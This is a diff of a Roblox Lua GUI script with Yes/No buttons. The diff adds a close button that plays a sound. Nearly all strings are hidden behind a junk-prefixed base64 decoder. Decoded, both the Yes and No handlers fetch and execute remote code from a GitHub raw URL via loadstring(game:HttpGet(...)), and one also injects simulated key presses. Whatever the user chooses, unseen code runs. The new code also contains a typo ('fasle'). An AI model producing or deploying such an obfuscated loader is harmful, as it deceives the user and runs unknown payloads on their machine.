@@ -19,6 +19,23 @@ Title.TextColor3 = Color3.new(0, 1, 0)
 Title.Font = Enum.Font.SourceSansBold  
 Title.TextSize = 20
 Title.Parent = Frame
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 50, 0, 50)
+closeButton.Position = UDim2.new(0.5, 100, 0.5, -100)
+closeButton.BackgroundColor3 = Color3.new(0.8, 0, 0)
+closeButton.Text = "X"
+closeButton.TextColor3 = Color3.new(1, 1, 1)
+closeButton.Parent = Frame
+closeButton.MouseButton1Click:Connect(function()
+Sadly = Instance.new("Sound", game.Workspace)
+Sadly.Name = "Sadly"
+Sadly.SoundId = "rbxassetid://6676616742"
+Sadly.Volume = 3
+Sadly.PlaybackSpeed = 1
+Sadly.Looped = fasle
+Sadly:Play()
+ScreenGui:Destroy()
+end)
 local YesButton = Instance.new(eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('BIYxOdQUVwinCIciJyXgSRTtjJpwUrwPABKNJqNIrPiYBvkHcriMzFqVGV4dEJ1dHRvbg=='))
 YesButton.Text = eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('RhwdePDiAOWKuXJruFINSpTQWcoftOdpjuhLOIcINjhIEBkBkcwZTWdU21hcnRwaG9uZQ==')
 YesButton.Position = UDim2.new(0, 0, 0, 51)
@@ -43,13 +60,12 @@ button.TextSize = 12
 local buttonCorner = Instance.new(eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('LvFwMoycvEOVyDqbLFQCETMWpsttnZqDAGLHkXcaIqeKFPzPlHGsFTxVUlDb3JuZXI='))
 buttonCorner.CornerRadius = UDim.new(0, 8)
 buttonCorner.Parent = button
-
 button.MouseButton1Click:Connect(function()
-    game:GetService(eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('mwvYPxQSoNuvnOVahHewWFimNpduqLyrBlXPSnpCyHFYJimYUhxQkrCVmlydHVhbElucHV0TWFuYWdlcg==')):SendKeyEvent(true, eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('GRMtxuARkmVeZmgfujPxRyOEqeZMjaQAdSsqVFAkFjLyFZOUfkeHYgoRjk=') , false , game)
+game:GetService(eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('mwvYPxQSoNuvnOVahHewWFimNpduqLyrBlXPSnpCyHFYJimYUhxQkrCVmlydHVhbElucHV0TWFuYWdlcg==')):SendKeyEvent(true, eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('GRMtxuARkmVeZmgfujPxRyOEqeZMjaQAdSsqVFAkFjLyFZOUfkeHYgoRjk=') , false , game)
 end)
 loadstring(game:HttpGet(eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('yhUPLCTVxrCgYiqhvsszhjuiGnEzPAIocXTMibApAufTaRGkuAjJDXhaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FEU0tlck9mZmljYWwvUEJDL21haW4vTHVhLU9iZnVzY2F0aW9u')))()
-   ScreenGui:Destroy() 
-   Spooky = Instance.new(eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('HXZrxgMQgzOyjPGQopBciizjpTrGypdSBLoIpfzsJRataLzGhiUdPedU291bmQ='), game.Workspace)
+ScreenGui:Destroy() 
+Spooky = Instance.new(eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('HXZrxgMQgzOyjPGQopBciizjpTrGypdSBLoIpfzsJRataLzGhiUdPedU291bmQ='), game.Workspace)
 Spooky.Name = eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('sFRKpLFOBJsjRUSeCLYoeJtblIQifJrGBDsGEtKcsKrhpDIrJvglgSrU3Bvb2t5')
 Spooky.SoundId = eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('SDbQGVHaMUfVRtGIZAMrfDZPmSmUIWrLHIislUBdwuBLMxkngIXRhjpcmJ4YXNzZXRpZDovLzIzOTA2OTEyOTk=')
 Spooky.Volume = 1
@@ -66,8 +82,8 @@ NoButton.TextColor3 = Color3.new(0, 1, 0)
 NoButton.Parent = Frame
 NoButton.MouseButton1Click:Connect(function()
 loadstring(game:HttpGet(eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('fPzcFvCpiySWeyMwvwmjIZMvaNrkYmboCntMOKjMHbCdKTpYsieyawJaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0FEU0tlck9mZmljYWwvUEJDL21haW4vTHVhLU9iZnVzY2F0aW9u')))()
-   ScreenGui:Destroy()
-   Spooky = Instance.new(eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('uAPRKhSONerhujwiTqGulzUzrSJnBeyElDdfUOjsMfqylDVPNfzIipcU291bmQ='), game.Workspace)
+ScreenGui:Destroy()
+Spooky = Instance.new(eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('uAPRKhSONerhujwiTqGulzUzrSJnBeyElDdfUOjsMfqylDVPNfzIipcU291bmQ='), game.Workspace)
 Spooky.Name = eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('iRhzyBuigIWfYWvAWRvzULTnPSpIHpQpifvWbcxphFdXDCTGdpOieZpU3Bvb2t5')
 Spooky.SoundId = eyzMWcREyqIYUIslWOZilFoVgZHJgOdlxbOUdMNqcNvHISfuyXnLfAlYxEvnVxXHDjiHCbIhFnqrpiS('FTtckLAjMgxQGxqHhDNQrtfgHpkjLXUSoDIeICGQfLOOMokjrQDDFpPcmJ4YXNzZXRpZDovLzIzOTA2OTU5MzU=')
 Spooky.Volume = 1
